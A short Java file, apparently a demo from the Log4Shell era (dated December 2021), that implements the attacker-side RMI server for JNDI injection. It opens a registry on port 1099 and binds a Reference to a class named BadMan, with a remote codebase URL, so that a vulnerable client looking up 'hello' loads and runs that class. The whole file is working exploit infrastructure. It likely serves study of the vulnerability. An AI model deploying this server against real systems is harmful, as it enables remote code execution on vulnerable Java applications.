package com.chenhenry.example2;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author chenhanli
 * @date 2021/12/12 8:45 下午
 */
public class BadManApp {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference reference = new Reference(BadMan.class.getName(), BadMan.class.getName(), "http://127.0.0.1:80/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("hello",referenceWrapper);
        } catch (RemoteException | AlreadyBoundException | NamingException e) {
            e.printStackTrace();
        }
    }
}
